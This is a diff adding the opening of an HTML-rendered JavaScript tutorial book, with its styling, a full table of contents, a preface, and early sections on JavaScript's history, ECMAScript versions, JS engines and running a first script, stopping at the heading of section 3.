@@ -1,0 +1,1968 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="light dark">
+<title>JavaScript — The Complete Field Guide (Beginner → Expert)</title>
+<style>
+:root{
+  --maxw: 46rem;
+  --bg:#fbfbf9; --fg:#1f2328; --muted:#59636e; --rule:#d8dee4;
+  --link:#0a5ad6; --codebg:#f4f6f8; --codefg:#1f2328; --codeborder:#dfe3e8;
+  --thead:#eef1f4; --rowalt:#f7f9fa; --sidebg:#f4f3ef; --mark:#fff3bf;
+  --serif: Georgia, "Iowan Old Style", "Palatino Linotype", "Book Antiqua", Palatino, "Noto Serif", serif;
+  --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  --mono: ui-monospace, "SF Mono", SFMono-Regular, "Menlo", "Consolas", "Liberation Mono", monospace;
+}
+@media (prefers-color-scheme: dark){
+  :root{
+    --bg:#0f1216; --fg:#d7dbe0; --muted:#9aa4af; --rule:#2a2f36;
+    --link:#5ea9ff; --codebg:#161a20; --codefg:#d7dbe0; --codeborder:#2a2f36;
+    --thead:#1a1f26; --rowalt:#14181d; --sidebg:#12151a; --mark:#5a4b12;
+  }
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0; background:var(--bg); color:var(--fg);
+  font-family:var(--serif); font-size:18px; line-height:1.7;
+  -webkit-text-size-adjust:100%; text-rendering:optimizeLegibility;
+}
+.layout{display:flex; align-items:flex-start}
+
+/* ---- sidebar ---- */
+.sidebar{
+  position:sticky; top:0; align-self:flex-start;
+  width:20rem; min-width:20rem; height:100vh; overflow:auto;
+  background:var(--sidebg); border-right:1px solid var(--rule);
+  font-family:var(--sans); font-size:13.5px; line-height:1.45;
+  padding:1.1rem 0.5rem 3rem 1.1rem;
+}
+.sidebar .book-mini{font-weight:700; font-size:14px; padding:.2rem .4rem .8rem; color:var(--muted)}
+#toc .toc-head{font-weight:700; text-transform:uppercase; letter-spacing:.08em;
+  font-size:11px; color:var(--muted); margin:.3rem .4rem .5rem}
+#toc ul{list-style:none; margin:0; padding:0}
+#toc .toc-part>a{display:block; font-weight:700; margin-top:.7rem; padding:.2rem .4rem;
+  color:var(--fg); text-decoration:none}
+#toc .toc-part>ul{margin:.1rem 0 .3rem}
+#toc .toc-ch a{display:block; padding:.12rem .4rem .12rem .9rem; color:var(--muted);
+  text-decoration:none; border-left:2px solid transparent}
+#toc .toc-ch.toc-loose a{padding-left:.4rem}
+#toc a:hover{color:var(--link)}
+#toc a.active{color:var(--fg); border-left-color:var(--link); background:rgba(10,90,214,.08)}
+
+/* ---- content ---- */
+.content{flex:1; min-width:0; display:flex; justify-content:center}
+article{
+  width:100%; max-width:var(--maxw);
+  padding:2.4rem 1.6rem 8rem;
+}
+h1,h2,h3,h4,h5,h6{font-family:var(--sans); line-height:1.25; font-weight:700;
+  margin:2.2em 0 .7em; scroll-margin-top:1rem; position:relative}
+h1{font-size:1.95rem; padding-bottom:.3em; border-bottom:2px solid var(--rule); margin-top:2.6em}
+h1.doc-title{font-size:2.5rem; border:0; margin:.2em 0 .1em}
+h2{font-size:1.5rem; padding-bottom:.25em; border-bottom:1px solid var(--rule)}
+h3{font-size:1.2rem}
+h4{font-size:1.03rem; color:var(--muted); text-transform:uppercase; letter-spacing:.03em}
+.anchor{position:absolute; left:-1.1em; padding-right:.4em; color:var(--muted);
+  opacity:0; text-decoration:none; font-weight:400}
+h1:hover .anchor,h2:hover .anchor,h3:hover .anchor,h4:hover .anchor{opacity:.6}
+.anchor:hover{opacity:1 !important; color:var(--link)}
+p{margin:0 0 1.05em}
+a{color:var(--link); text-decoration:none}
+a:hover{text-decoration:underline}
+strong{font-weight:700}
+hr{border:0; border-top:1px solid var(--rule); margin:2.4em 0}
+
+ul,ol{margin:0 0 1.1em; padding-left:1.5em}
+li{margin:.3em 0}
+li>ul,li>ol{margin:.35em 0 .35em}
+li>p{margin:.4em 0}
+
+blockquote{margin:1.2em 0; padding:.6em 1.1em; border-left:4px solid var(--link);
+  background:var(--codebg); border-radius:0 6px 6px 0; color:var(--fg)}
+blockquote p:last-child{margin-bottom:0}
+
+/* ---- code: preserve alignment, scroll instead of wrap ---- */
+code{font-family:var(--mono); font-size:.86em; background:var(--codebg);
+  border:1px solid var(--codeborder); border-radius:4px; padding:.08em .35em}
+pre{position:relative; background:var(--codebg); color:var(--codefg);
+  border:1px solid var(--codeborder); border-radius:8px;
+  padding:1rem 1.1rem; margin:1.2em 0; overflow-x:auto;
+  font-family:var(--mono); font-size:13.5px; line-height:1.5;
+  -moz-tab-size:4; tab-size:4;}
+pre code{background:none; border:0; padding:0; font-size:inherit;
+  white-space:pre; display:block}
+pre[data-lang]::before{content:attr(data-lang); position:absolute; top:0; right:0;
+  font-family:var(--sans); font-size:10.5px; letter-spacing:.06em; text-transform:uppercase;
+  color:var(--muted); background:var(--bg); border:1px solid var(--codeborder);
+  border-top:0; border-right:0; border-radius:0 8px 0 6px; padding:.12em .55em}
+
+/* ---- tables ---- */
+.tbl{overflow-x:auto; margin:1.3em 0; border:1px solid var(--rule); border-radius:8px}
+table{border-collapse:collapse; width:100%; font-family:var(--sans); font-size:13.5px; line-height:1.45}
+th,td{border:1px solid var(--rule); padding:7px 11px; text-align:left; vertical-align:top}
+thead th{background:var(--thead); font-weight:700; position:sticky; top:0}
+tbody tr:nth-child(even){background:var(--rowalt)}
+td code,th code{font-size:12.5px}
+
+/* ---- topbar (mobile) ---- */
+.topbar{display:none; position:sticky; top:0; z-index:30;
+  background:var(--bg); border-bottom:1px solid var(--rule);
+  font-family:var(--sans); padding:.5rem .8rem; align-items:center; gap:.7rem}
+.topbar button{font:inherit; padding:.35rem .7rem; border:1px solid var(--rule);
+  background:var(--sidebg); color:var(--fg); border-radius:6px; cursor:pointer}
+.topbar .t-title{font-weight:700; font-size:14px; color:var(--muted); overflow:hidden;
+  white-space:nowrap; text-overflow:ellipsis}
+
+.totop{position:fixed; right:1rem; bottom:1rem; z-index:40;
+  font-family:var(--sans); font-size:12px; padding:.5rem .7rem; border-radius:20px;
+  border:1px solid var(--rule); background:var(--sidebg); color:var(--fg);
+  cursor:pointer; opacity:0; pointer-events:none; transition:opacity .2s}
+.totop.show{opacity:.92; pointer-events:auto}
+
+@media (max-width: 1024px){
+  .sidebar{position:fixed; z-index:50; left:0; top:0; transform:translateX(-102%);
+    transition:transform .22s ease; box-shadow:0 0 40px rgba(0,0,0,.25)}
+  .sidebar.open{transform:none}
+  .topbar{display:flex}
+  article{padding:1.6rem 1.1rem 6rem}
+  .anchor{display:none}
+  body{font-size:17px}
+}
+
+/* ---- print / PDF: a real book ---- */
+@media print{
+  .sidebar,.topbar,.totop,.anchor{display:none !important}
+  .layout{display:block}
+  article{max-width:none; padding:0}
+  body{background:#fff; color:#000; font-size:11pt; line-height:1.5}
+  h1{page-break-before:always; border-bottom:2px solid #000}
+  h1.doc-title,h1:first-of-type{page-break-before:avoid}
+  h2{page-break-before:auto}
+  h1,h2,h3,h4{page-break-after:avoid}
+  pre,table,blockquote,.tbl{page-break-inside:avoid}
+  pre{font-size:8.5pt; white-space:pre-wrap; word-break:break-word;
+      border:1px solid #999; background:#f4f4f4}
+  a{color:#000; text-decoration:none}
+  thead th{position:static}
+  @page{margin:18mm 16mm}
+}
+</style>
+</head>
+<body>
+<div class="topbar">
+  <button id="navToggle" aria-label="Toggle contents">☰ Contents</button>
+  <span class="t-title">JavaScript — The Complete Field Guide (Beginner → Expert)</span>
+</div>
+<div class="layout">
+  <aside class="sidebar">
+    <div class="book-mini">JavaScript — The Complete Field Guide (Beginner → Expert)</div>
+    <nav id="toc"><div class="toc-head">Contents</div>
+<ul class="toc-list">
+<li class="toc-ch toc-loose"><a href="#how-to-use-this-guide">How to use this guide</a></li>
+<li class="toc-ch toc-loose"><a href="#table-of-contents">Table of contents</a></li>
+<li class="toc-part"><a href="#part-i-foundations-the-js-way">Part I — Foundations: the JS way</a><ul>
+<li class="toc-ch"><a href="#1-what-javascript-is-and-the-engines-that-run-it">1. What JavaScript is, and the engines that run it</a></li>
+<li class="toc-ch"><a href="#2-running-js-console-node-and-your-first-script">2. Running JS: console, Node, and your first script</a></li>
+<li class="toc-ch"><a href="#3-values-and-types-primitives-coercion-vs">3. Values and types: primitives, coercion, == vs ===</a></li>
+<li class="toc-ch"><a href="#4-variables-and-scope-var-let-const-hoisting-the-tdz">4. Variables and scope: var/let/const, hoisting, the TDZ</a></li>
+<li class="toc-ch"><a href="#5-operators-and-control-flow">5. Operators and control flow</a></li>
+<li class="toc-ch"><a href="#6-functions-in-depth-closures-this-call-apply-bind">6. Functions in depth: closures, this, call/apply/bind</a></li>
+<li class="toc-ch"><a href="#7-objects-and-prototypes-the-prototype-chain-classes-as-sugar">7. Objects and prototypes: the prototype chain, classes as sugar</a></li>
+<li class="toc-ch"><a href="#8-arrays-and-iteration-methods-iterators-generators">8. Arrays and iteration: methods, iterators, generators</a></li>
+<li class="toc-ch"><a href="#9-strings-template-literals-and-regular-expressions">9. Strings, template literals, and regular expressions</a></li>
+<li class="toc-ch"><a href="#10-error-handling-try-catch-custom-error-subclasses">10. Error handling: try/catch, custom Error subclasses</a></li>
+<li class="toc-ch"><a href="#11-mini-project-a-cli-todo-app-node">11. Mini project: a CLI todo app (Node)</a></li>
+</ul></li>
+<li class="toc-part"><a href="#part-ii-intermediate-async-javascript-and-the-event-loop">Part II — Intermediate: async JavaScript and the event loop</a><ul>
+<li class="toc-ch"><a href="#12-the-call-stack-heap-and-the-event-loop-model">12. The call stack, heap, and the event loop model</a></li>
+<li class="toc-ch"><a href="#13-callbacks-and-promises-what-actually-happens-under-the-hood">13. Callbacks and Promises: what actually happens under the hood</a></li>
+<li class="toc-ch"><a href="#14-async-await-sugar-over-promises-and-its-sharp-edges">14. async/await: sugar over promises, and its sharp edges</a></li>
+<li class="toc-ch"><a href="#15-timers-and-scheduling-settimeout-raf-requestidlecallback-messagechannel">15. Timers and scheduling: setTimeout, rAF, requestIdleCallback, MessageChannel</a></li>
+<li class="toc-ch"><a href="#16-modules-commonjs-vs-es-modules-bundlers-dynamic-import">16. Modules: CommonJS vs ES Modules, bundlers, dynamic import()</a></li>
+<li class="toc-ch"><a href="#17-mini-project-an-async-task-queue-with-concurrency-limits-and-retry">17. Mini project: an async task queue with concurrency limits and retry</a></li>
+</ul></li>
+<li class="toc-part"><a href="#part-iii-inside-the-browser">Part III — Inside the browser</a><ul>
+<li class="toc-ch"><a href="#18-the-browser-s-process-model-multi-process-architecture-and-site-isolation">18. The browser's process model: multi-process architecture and site isolation</a></li>
+<li class="toc-ch"><a href="#19-browser-engines-compared-blink-v8-gecko-spidermonkey-webkit-javascriptcore">19. Browser engines compared: Blink/V8, Gecko/SpiderMonkey, WebKit/JavaScriptCore</a></li>
+<li class="toc-ch"><a href="#20-the-dom-and-bom-window-document-node-trees-the-cssom">20. The DOM and BOM: window, document, node trees, the CSSOM</a></li>
+<li class="toc-ch"><a href="#21-the-critical-rendering-path-bytes-dom-cssom-render-tree-layout-paint-composite">21. The critical rendering path: bytes → DOM → CSSOM → render tree → layout → paint → composite</a></li>
+<li class="toc-ch"><a href="#22-compositing-and-the-gpu-layers-rasterization-the-16-6ms-frame-budget-jank">22. Compositing and the GPU: layers, rasterization, the 16.6ms frame budget, jank</a></li>
+<li class="toc-ch"><a href="#23-the-event-model-capturing-bubbling-delegation-passive-listeners">23. The event model: capturing, bubbling, delegation, passive listeners</a></li>
+<li class="toc-ch"><a href="#24-mini-project-finding-and-fixing-jank-with-the-performance-panel">24. Mini project: finding and fixing jank with the Performance panel</a></li>
+</ul></li>
+<li class="toc-part"><a href="#part-iv-http-networking-and-the-browser">Part IV — HTTP, networking, and the browser</a><ul>
+<li class="toc-ch"><a href="#25-http-fundamentals-for-js-developers">25. HTTP fundamentals for JS developers</a></li>
+<li class="toc-ch"><a href="#26-http-1-1-vs-http-2-vs-http-3-in-the-browser">26. HTTP/1.1 vs HTTP/2 vs HTTP/3 in the browser</a></li>
+<li class="toc-ch"><a href="#27-fetch-and-xmlhttprequest-requests-streaming-aborting">27. fetch and XMLHttpRequest: requests, streaming, aborting</a></li>
+<li class="toc-ch"><a href="#28-cors-in-depth-same-origin-policy-preflight-credentials">28. CORS in depth: same-origin policy, preflight, credentials</a></li>
+<li class="toc-ch"><a href="#29-http-caching-and-the-browser-cache">29. HTTP caching and the browser cache</a></li>
+<li class="toc-ch"><a href="#30-websockets-and-server-sent-events">30. WebSockets and Server-Sent Events</a></li>
+<li class="toc-ch"><a href="#31-mini-project-a-resilient-fetch-client-timeout-retry-cache-dedup">31. Mini project: a resilient fetch client (timeout, retry, cache, dedup)</a></li>
+</ul></li>
+<li class="toc-part"><a href="#part-v-rendering-web-applications-in-depth">Part V — Rendering web applications in depth</a><ul>
+<li class="toc-ch"><a href="#32-rendering-models-csr-ssr-ssg-isr">32. Rendering models: CSR, SSR, SSG, ISR</a></li>
+<li class="toc-ch"><a href="#33-virtual-dom-reconciliation-vs-fine-grained-reactivity-signals">33. Virtual DOM reconciliation vs fine-grained reactivity (signals)</a></li>
+<li class="toc-ch"><a href="#34-hydration-and-partial-progressive-resumable-hydration">34. Hydration and partial/progressive/resumable hydration</a></li>
+<li class="toc-ch"><a href="#35-core-web-vitals-lcp-inp-cls-measuring-and-fixing-them">35. Core Web Vitals: LCP, INP, CLS — measuring and fixing them</a></li>
+<li class="toc-ch"><a href="#36-mini-project-a-virtual-dom-renderer-from-scratch-150-lines">36. Mini project: a virtual-DOM renderer from scratch (~150 lines)</a></li>
+</ul></li>
+<li class="toc-part"><a href="#part-vi-advanced-js-concurrency-and-multi-threaded-browser-apps">Part VI — Advanced JS: concurrency and multi-threaded browser apps</a><ul>
+<li class="toc-ch"><a href="#37-why-js-is-mostly-single-threaded-and-what-that-really-means">37. Why JS is (mostly) single-threaded, and what that really means</a></li>
+<li class="toc-ch"><a href="#38-web-workers-postmessage-structured-clone-transferable-objects">38. Web Workers: postMessage, structured clone, transferable objects</a></li>
+<li class="toc-ch"><a href="#39-sharedarraybuffer-and-atomics-real-shared-memory-concurrency">39. SharedArrayBuffer and Atomics: real shared-memory concurrency</a></li>
+<li class="toc-ch"><a href="#40-shared-workers-and-service-workers-lifecycle-scope-background-sync">40. Shared Workers and Service Workers: lifecycle, scope, background sync</a></li>
+<li class="toc-ch"><a href="#41-multi-threaded-architecture-patterns-worker-pools-comlink-style-rpc">41. Multi-threaded architecture patterns: worker pools, Comlink-style RPC</a></li>
+<li class="toc-ch"><a href="#42-mini-project-a-multi-threaded-mandelbrot-renderer-worker-pool-sab">42. Mini project: a multi-threaded Mandelbrot renderer (worker pool + SAB)</a></li>
+</ul></li>
+<li class="toc-part"><a href="#part-vii-client-side-storage-and-encryption">Part VII — Client-side storage and encryption</a><ul>
+<li class="toc-ch"><a href="#43-cookies-in-depth-attributes-httponly-secure-samesite">43. Cookies in depth: attributes, HttpOnly/Secure/SameSite</a></li>
+<li class="toc-ch"><a href="#44-localstorage-and-sessionstorage-api-quotas-pitfalls">44. localStorage and sessionStorage: API, quotas, pitfalls</a></li>
+<li class="toc-ch"><a href="#45-indexeddb-transactional-storage-for-structured-larger-data">45. IndexedDB: transactional storage for structured, larger data</a></li>
+<li class="toc-ch"><a href="#46-the-web-crypto-api-hashing-aes-gcm-key-derivation-asymmetric-crypto">46. The Web Crypto API: hashing, AES-GCM, key derivation, asymmetric crypto</a></li>
+<li class="toc-ch"><a href="#47-what-client-side-encryption-can-t-protect-against-the-xss-threat-model">47. What client-side encryption can't protect against: the XSS threat model</a></li>
+<li class="toc-ch"><a href="#48-mini-project-an-encrypted-notes-app-web-crypto-indexeddb">48. Mini project: an encrypted notes app (Web Crypto + IndexedDB)</a></li>
+</ul></li>
+<li class="toc-part"><a href="#part-viii-expert-engine-internals-and-browser-security">Part VIII — Expert: engine internals and browser security</a><ul>
+<li class="toc-ch"><a href="#49-inside-v8-parsing-ignition-bytecode-turbofan-hidden-classes-inline-caches">49. Inside V8: parsing, Ignition bytecode, TurboFan, hidden classes, inline caches</a></li>
+<li class="toc-ch"><a href="#50-garbage-collection-and-memory-leaks-in-real-js-apps">50. Garbage collection and memory leaks in real JS apps</a></li>
+<li class="toc-ch"><a href="#51-browser-security-internals-csp-sandboxing-spectre-site-isolation">51. Browser security internals: CSP, sandboxing, Spectre, site isolation</a></li>
+</ul></li>
+<li class="toc-part"><a href="#part-ix-capstone">Part IX — Capstone</a><ul>
+<li class="toc-ch"><a href="#52-capstone-an-offline-first-multi-threaded-end-to-end-encrypted-notes-pwa">52. Capstone: an offline-first, multi-threaded, end-to-end-encrypted notes PWA</a></li>
+<li class="toc-ch"><a href="#appendix-a-event-loop-task-ordering-cheat-sheet">Appendix A: Event-loop task-ordering cheat sheet</a></li>
+<li class="toc-ch"><a href="#appendix-b-storage-options-comparison-table">Appendix B: Storage options comparison table</a></li>
+<li class="toc-ch"><a href="#appendix-c-web-crypto-api-cheat-sheet">Appendix C: Web Crypto API cheat sheet</a></li>
+<li class="toc-ch"><a href="#appendix-d-glossary">Appendix D: Glossary</a></li>
+<li class="toc-ch"><a href="#appendix-e-further-reading">Appendix E: Further reading</a></li>
+</ul></li>
+</ul></nav>
+
+    <div class="book-mini" style="font-weight:400;margin-top:1.5rem">Generated 2026-09-13</div>
+  </aside>
+  <div class="content">
+    <article>
+<h1 id="javascript-the-complete-field-guide-beginner-expert" class="doc-title">JavaScript — The Complete Field Guide (Beginner → Expert)<a class="anchor" href="#javascript-the-complete-field-guide-beginner-expert" aria-hidden="true">#</a></h1>
+<blockquote>
+<p>A practical, example-driven path through JavaScript: the language itself, the browser it usually runs in, the network it talks over, and the multi-threaded, encrypted, offline-capable applications you can build once you understand all three.</p>
+<p>Every concept is paired with runnable code, a "Real-world example" or "War story," and — at the end of each Part — a mini-project you can build today. Read it once top to bottom; keep it as a lookup guide.</p>
+</blockquote>
+<hr>
+<h2 id="how-to-use-this-guide">How to use this guide<a class="anchor" href="#how-to-use-this-guide" aria-hidden="true">#</a></h2>
+<ul>
+<li><strong>Beginner (Part I):</strong> values, types, scope, functions, objects, prototypes, arrays, strings, errors. Ends with a CLI mini-project.</li>
+<li><strong>Intermediate (Part II):</strong> the event loop, callbacks, Promises, async/await, timers, modules. Ends with an async task queue.</li>
+<li><strong>Browser internals (Part III):</strong> the browser's multi-process architecture, how Blink/Gecko/WebKit actually differ, the DOM/CSSOM, and the critical rendering path from bytes to pixels.</li>
+<li><strong>Networking (Part IV):</strong> HTTP fundamentals, HTTP/1.1 vs 2 vs 3 in the browser, <code>fetch</code>, CORS, caching, WebSockets.</li>
+<li><strong>Rendering applications (Part V):</strong> CSR/SSR/SSG, virtual DOM vs fine-grained reactivity, hydration, Core Web Vitals.</li>
+<li><strong>Advanced: concurrency (Part VI):</strong> Web Workers, <code>SharedArrayBuffer</code> + <code>Atomics</code>, Shared/Service Workers, real multi-threaded browser architectures.</li>
+<li><strong>Client-side storage &amp; security (Part VII):</strong> cookies, <code>localStorage</code>, <code>sessionStorage</code>, IndexedDB, and the Web Crypto API — including exactly what client-side encryption can and can't protect against.</li>
+<li><strong>Expert (Part VIII):</strong> what's actually happening inside V8 — parsing, bytecode, the JIT, garbage collection, and browser sandboxing.</li>
+<li><strong>Capstone (Part IX):</strong> an offline-first, multi-threaded, end-to-end encrypted note-taking app that uses nearly everything in this guide.</li>
+</ul>
+<p>Conventions:</p>
+<ul>
+<li>Code targets evergreen browsers and modern Node.js (ES2022+). Version-gated features (e.g. <code>Array.prototype.group</code>, cross-origin isolation requirements) are called out explicitly.</li>
+<li>"<strong>Real-world example</strong>" boxes ground a concept in something you'll actually build. "<strong>War story</strong>" boxes describe a real incident or trade-off engineers have hit in production.</li>
+<li>This guide is JS/browser-specific. For the network layer underneath <code>fetch</code>/HTTP, see <a href="../networking/tcp-ip/real-life-example.html"><code>wiki/networking/tcp-ip/real-life-example.md</code></a>; for the load-testing/perf-measurement side of the APIs you'll build here, see <a href="../scale-perf/real-life-scale-guide.html"><code>wiki/scale-perf/real-life-scale-guide.md</code></a>.</li>
+</ul>
+<hr>
+<h2 id="table-of-contents">Table of contents<a class="anchor" href="#table-of-contents" aria-hidden="true">#</a></h2>
+<p><strong>Part I — Foundations: the JS way</strong></p>
+<ol>
+<li>What JavaScript is, and the engines that run it</li>
+<li>Running JS: console, Node, and your first script</li>
+<li>Values and types: primitives, coercion, <code>==</code> vs <code>===</code></li>
+<li>Variables and scope: <code>var</code>/<code>let</code>/<code>const</code>, hoisting, the TDZ</li>
+<li>Operators and control flow</li>
+<li>Functions in depth: closures, <code>this</code>, <code>call</code>/<code>apply</code>/<code>bind</code></li>
+<li>Objects and prototypes: the prototype chain, classes as sugar</li>
+<li>Arrays and iteration: methods, iterators, generators</li>
+<li>Strings, template literals, and regular expressions</li>
+<li>Error handling: <code>try</code>/<code>catch</code>, custom <code>Error</code> subclasses</li>
+<li>Mini project: a CLI todo app (Node)</li>
+</ol>
+<p><strong>Part II — Intermediate: async JavaScript and the event loop</strong></p>
+<ol start="12">
+<li>The call stack, heap, and the event loop model</li>
+<li>Callbacks and Promises: what actually happens under the hood</li>
+<li><code>async</code>/<code>await</code>: sugar over promises, and its sharp edges</li>
+<li>Timers and scheduling: <code>setTimeout</code>, rAF, <code>requestIdleCallback</code>, <code>MessageChannel</code></li>
+<li>Modules: CommonJS vs ES Modules, bundlers, dynamic <code>import()</code></li>
+<li>Mini project: an async task queue with concurrency limits and retry</li>
+</ol>
+<p><strong>Part III — Inside the browser</strong></p>
+<ol start="18">
+<li>The browser's process model: multi-process architecture and site isolation</li>
+<li>Browser engines compared: Blink/V8, Gecko/SpiderMonkey, WebKit/JavaScriptCore</li>
+<li>The DOM and BOM: <code>window</code>, <code>document</code>, node trees, the CSSOM</li>
+<li>The critical rendering path: bytes → DOM → CSSOM → render tree → layout → paint → composite</li>
+<li>Compositing and the GPU: layers, rasterization, the 16.6ms frame budget, jank</li>
+<li>The event model: capturing, bubbling, delegation, passive listeners</li>
+<li>Mini project: finding and fixing jank with the Performance panel</li>
+</ol>
+<p><strong>Part IV — HTTP, networking, and the browser</strong></p>
+<ol start="25">
+<li>HTTP fundamentals for JS developers</li>
+<li>HTTP/1.1 vs HTTP/2 vs HTTP/3 in the browser</li>
+<li><code>fetch</code> and <code>XMLHttpRequest</code>: requests, streaming, aborting</li>
+<li>CORS in depth: same-origin policy, preflight, credentials</li>
+<li>HTTP caching and the browser cache</li>
+<li>WebSockets and Server-Sent Events</li>
+<li>Mini project: a resilient fetch client (timeout, retry, cache, dedup)</li>
+</ol>
+<p><strong>Part V — Rendering web applications in depth</strong></p>
+<ol start="32">
+<li>Rendering models: CSR, SSR, SSG, ISR</li>
+<li>Virtual DOM reconciliation vs fine-grained reactivity (signals)</li>
+<li>Hydration and partial/progressive/resumable hydration</li>
+<li>Core Web Vitals: LCP, INP, CLS — measuring and fixing them</li>
+<li>Mini project: a virtual-DOM renderer from scratch (~150 lines)</li>
+</ol>
+<p><strong>Part VI — Advanced JS: concurrency and multi-threaded browser apps</strong></p>
+<ol start="37">
+<li>Why JS is (mostly) single-threaded, and what that really means</li>
+<li>Web Workers: <code>postMessage</code>, structured clone, transferable objects</li>
+<li><code>SharedArrayBuffer</code> and <code>Atomics</code>: real shared-memory concurrency</li>
+<li>Shared Workers and Service Workers: lifecycle, scope, background sync</li>
+<li>Multi-threaded architecture patterns: worker pools, Comlink-style RPC</li>
+<li>Mini project: a multi-threaded Mandelbrot renderer (worker pool + SAB)</li>
+</ol>
+<p><strong>Part VII — Client-side storage and encryption</strong></p>
+<ol start="43">
+<li>Cookies in depth: attributes, <code>HttpOnly</code>/<code>Secure</code>/<code>SameSite</code></li>
+<li><code>localStorage</code> and <code>sessionStorage</code>: API, quotas, pitfalls</li>
+<li>IndexedDB: transactional storage for structured, larger data</li>
+<li>The Web Crypto API: hashing, AES-GCM, key derivation, asymmetric crypto</li>
+<li>What client-side encryption can't protect against: the XSS threat model</li>
+<li>Mini project: an encrypted notes app (Web Crypto + IndexedDB)</li>
+</ol>
+<p><strong>Part VIII — Expert: engine internals and browser security</strong></p>
+<ol start="49">
+<li>Inside V8: parsing, Ignition bytecode, TurboFan, hidden classes, inline caches</li>
+<li>Garbage collection and memory leaks in real JS apps</li>
+<li>Browser security internals: CSP, sandboxing, Spectre, site isolation</li>
+</ol>
+<p><strong>Part IX — Capstone</strong></p>
+<ol start="52">
+<li>Capstone: an offline-first, multi-threaded, end-to-end-encrypted notes PWA</li>
+</ol>
+<p><strong>Appendices</strong></p>
+<ul>
+<li>A. Event-loop task-ordering cheat sheet</li>
+<li>B. Storage options comparison table</li>
+<li>C. Web Crypto API cheat sheet</li>
+<li>D. Glossary</li>
+<li>E. Further reading</li>
+</ul>
+<hr>
+<h1 id="part-i-foundations-the-js-way">Part I — Foundations: the JS way<a class="anchor" href="#part-i-foundations-the-js-way" aria-hidden="true">#</a></h1>
+<h2 id="1-what-javascript-is-and-the-engines-that-run-it">1. What JavaScript is, and the engines that run it<a class="anchor" href="#1-what-javascript-is-and-the-engines-that-run-it" aria-hidden="true">#</a></h2>
+<p>JavaScript was written by Brendan Eich at Netscape in <strong>10 days in 1995</strong>. It was rushed to market to make web pages "alive" (validate a form, animate a menu) and deliberately made to <em>look</em> like Java for marketing reasons — despite the two languages sharing almost nothing beyond syntax. That rushed origin explains a surprising amount of the language's quirky behavior (<code>typeof null === "object"</code>, automatic semicolon insertion, <code>==</code> coercion rules) that later specs couldn't remove without breaking the web.</p>
+<p><strong>ECMAScript</strong> is the standardized specification JavaScript implements (ECMA International, TC39 committee). "JavaScript" and "ECMAScript" are used almost interchangeably; version names you'll see in the wild:</p>
+<div class="tbl"><table>
+<thead><tr><th>Name</th><th>Year</th><th>Notable additions</th></tr></thead>
+<tbody>
+<tr><td>ES5</td><td>2009</td><td><code>strict mode</code>, <code>Array.prototype.map/filter/reduce</code>, <code>JSON</code></td></tr>
+<tr><td>ES6 / ES2015</td><td>2015</td><td><code>let</code>/<code>const</code>, classes, arrow functions, Promises, modules, template literals, destructuring</td></tr>
+<tr><td>ES2017</td><td>2017</td><td><code>async</code>/<code>await</code></td></tr>
+<tr><td>ES2020</td><td>2020</td><td>optional chaining <code>?.</code>, nullish coalescing <code>??</code>, <code>BigInt</code></td></tr>
+<tr><td>ES2022</td><td>2022</td><td>top-level <code>await</code>, class private fields (<code>#x</code>)</td></tr>
+<tr><td>ES2023+</td><td>2023+</td><td><code>Array.prototype.toSorted</code>/<code>with</code>, incremental yearly additions</td></tr>
+</tbody></table></div>
+<p>TC39 ships one edition per year now; there's no "waiting for ES7" anymore — proposals move through stages 0→4 and ship independently once they reach Stage 4.</p>
+<p><strong>Engines</strong> are the programs that actually execute JS. Every browser (and Node.js, Deno, Bun) embeds one:</p>
+<div class="tbl"><table>
+<thead><tr><th>Engine</th><th>Ships in</th><th>JIT tiers</th></tr></thead>
+<tbody>
+<tr><td><strong>V8</strong></td><td>Chrome, Edge, Opera, Node.js, Deno</td><td>Ignition (interpreter) → Sparkplug (baseline JIT) → Maglev → TurboFan (optimizing JIT)</td></tr>
+<tr><td><strong>SpiderMonkey</strong></td><td>Firefox</td><td>Interpreter → Baseline → Ion (optimizing JIT)</td></tr>
+<tr><td><strong>JavaScriptCore (Nitro)</strong></td><td>Safari, all iOS browsers (WebKit is mandated for <em>all</em> browsers on iOS by Apple)</td><td>LLInt (interpreter) → Baseline → DFG → FTL (optimizing JIT)</td></tr>
+</tbody></table></div>
+<p>All three converge on roughly the same idea: start executing quickly with a simple interpreter, watch which functions run hot, and recompile <em>those</em> to optimized machine code — because compiling everything ahead of time would make page load unacceptably slow, and interpreting everything forever would make hot loops unacceptably slow. §49 goes deep on V8's specific pipeline.</p>
+<blockquote>
+<p><strong>Real-world example.</strong> "Why does my code run fine in Chrome but is subtly slower/different in Safari?" — often it's not a bug, it's JavaScriptCore's different JIT heuristics and GC pause behavior. Cross-browser testing isn't optional if you ship to consumers; §19 covers the concrete engine differences that cause this.</p>
+</blockquote>
+<h2 id="2-running-js-console-node-and-your-first-script">2. Running JS: console, Node, and your first script<a class="anchor" href="#2-running-js-console-node-and-your-first-script" aria-hidden="true">#</a></h2>
+<p>Three environments you'll write JS in, and what's different about each:</p>
+<ul>
+<li><strong>Browser console/DevTools</strong>: has <code>window</code>, <code>document</code>, and every Web API (<code>fetch</code>, <code>localStorage</code>, Web Workers) but no filesystem/<code>require</code>.</li>
+<li><strong>Node.js</strong>: has <code>fs</code>, <code>process</code>, <code>require</code>/CommonJS (or ESM with <code>"type": "module"</code>), but no <code>window</code>/<code>document</code>/DOM — it's a server-side runtime, not a browser.</li>
+<li><strong><code>&lt;script&gt;</code> tag in an HTML file</strong>: same globals as the console, but runs in the page's actual execution context, wired to real DOM elements.
+<pre data-lang="javascript"><code>// hello.js — run with `node hello.js`
+console.log("Hello from Node", process.version);
+
+// index.html — open directly in a browser
+// &lt;script&gt;
+//   console.log("Hello from the browser", navigator.userAgent);
+//   document.body.textContent = "Hello, DOM";
+// &lt;/script&gt;</code></pre>
+</li>
+</ul>
+<p><code>"use strict"</code> (automatic in ES modules and classes) turns silent mistakes into thrown errors: assigning to an undeclared variable, duplicate parameter names, and several others. There's no reason to write new non-strict code in 2026 — always target modules or explicit strict mode.</p>
+<h2 id="3-values-and-types-primitives-coercion-vs">3. Values and types: primitives, coercion, <code>==</code> vs <code>===</code><a class="anchor" href="#3-values-and-types-primitives-coercion-vs" aria-hidden="true">#</a></h2>
